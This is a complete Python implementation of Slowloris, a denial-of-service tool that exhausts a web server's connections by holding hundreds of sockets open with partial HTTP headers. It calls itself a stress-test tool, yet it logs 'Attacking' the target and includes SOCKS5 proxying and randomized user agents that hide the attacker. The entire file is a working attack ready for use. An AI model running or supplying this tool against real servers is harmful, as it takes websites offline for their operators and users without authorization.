import argparse
import logging
import random
import socket
import ssl
import sys
import threading
import time

DEFAULT_SOCKETS = 250
DEFAULT_SLEEPTIME = 15

def parse_arguments():
    parser = argparse.ArgumentParser(description="Slowloris, low bandwidth stress test tool for websites")
    parser.add_argument("host", nargs="?", help="Host to perform stress test on")
    parser.add_argument("-p", "--port", default=80, help="Port of webserver, usually 80", type=int)
    parser.add_argument("-s", "--sockets", default=DEFAULT_SOCKETS, help="Number of sockets to use in the test (default: 250)", type=int)
    parser.add_argument("-v", "--verbose", action="store_true", help="Increases logging")
    parser.add_argument("-ua", "--randuseragents", action="store_true", help="Randomizes user-agents with each request")
    parser.add_argument("-x", "--useproxy", action="store_true", help="Use SOCKS5 proxies for connecting")
    parser.add_argument("--proxy-host", default="127.0.0.1", help="SOCKS5 proxy host")
    parser.add_argument("--proxy-port", default=8080, help="SOCKS5 proxy port", type=int)
    parser.add_argument("--https", action="store_true", help="Use HTTPS for the requests")
    parser.add_argument("--sleeptime", default=DEFAULT_SLEEPTIME, type=int, help="Time to sleep between each header sent (default: 15 seconds).")
    parser.add_argument("-uastr", "--useragents", nargs="+", help="List of user agents to use")
    args = parser.parse_args()
    
    if not args.host:
        parser.print_help()
        sys.exit(1)
    
    return args

def setup_logging(verbose):
    logging.basicConfig(format="[%(asctime)s] %(message)s", datefmt="%d-%m-%Y %H:%M:%S", level=logging.DEBUG if verbose else logging.INFO)

def get_user_agents(args):
    return args.useragents if args.useragents else [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36 Edg/97.0.1072.76",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36 OPR/83.0.4254.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36 Vivaldi/5.1",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0.2",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0.3",
        "Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 13; SM-S908U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 13; SM-G991U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 13; SM-G998U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 13; SM-S901U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 13; SM-G991U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36"
    ]

def init_socket(ip, args, user_agents):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(4)

    if args.https:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        s = ctx.wrap_socket(s, server_hostname=args.host)

    if args.useproxy:
        try:
            import socks
            socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, args.proxy_host, args.proxy_port)
            socket.socket = socks.socksocket
            logging.info("Using SOCKS5 proxy for connecting...")
        except ImportError:
            logging.error("Socks Proxy Library Not Available!")
            sys.exit(1)

    try:
        s.connect((ip, args.port))
        s.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode())
        ua = random.choice(user_agents) if args.randuseragents else user_agents[0]
        s.send(f"User-Agent: {ua}\r\n".encode())
        s.send(b"Accept-language: en-US,en;q=0.5\r\n\r\n")
        return s
    except socket.error as e:
        logging.debug(f"Socket error: {e}")
        return None

def create_sockets(ip, args, user_agents, list_of_sockets, lock):
    logging.info("Creating sockets...")
    for _ in range(args.sockets):
        s = init_socket(ip, args, user_agents)
        if s:
            with lock:
                list_of_sockets.append(s)

def send_keep_alive(args, list_of_sockets, lock):
    logging.info("Sending keep-alive headers...")
    logging.info("Socket count: %s", len(list_of_sockets))

    sockets_to_remove = []

    for s in list(list_of_sockets):
        try:
            s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
        except socket.error:
            sockets_to_remove.append(s)

    with lock:
        for s in sockets_to_remove:
            if s in list_of_sockets:
                list_of_sockets.remove(s)

    diff = args.sockets - len(list_of_sockets)
    if diff > 0:
        logging.info("Creating %s new sockets...", diff)
        create_sockets(args.host, args, get_user_agents(args), list_of_sockets, lock)

def main():
    args = parse_arguments()
    setup_logging(args.verbose)
    user_agents = get_user_agents(args)

    list_of_sockets = []
    lock = threading.Lock()

    ip = args.host
    logging.info("Attacking %s with %s sockets.", ip, args.sockets)
    create_sockets(ip, args, user_agents, list_of_sockets, lock)

    while True:
        try:
            threads = [threading.Thread(target=send_keep_alive, args=(args, list_of_sockets, lock)) for _ in range(args.sockets)]
            for t in threads:
                t.daemon = True
                t.start()

            for t in threads:
                t.join(timeout=0.5)

            logging.debug("Sleeping for %d seconds", args.sleeptime)
            time.sleep(args.sleeptime)
        except (KeyboardInterrupt, SystemExit):
            logging.info("Stopping Slowloris")
            break
        except Exception as e:
            logging.debug("Error in Slowloris iteration: %s", e)

if __name__ == "__main__":
    main()

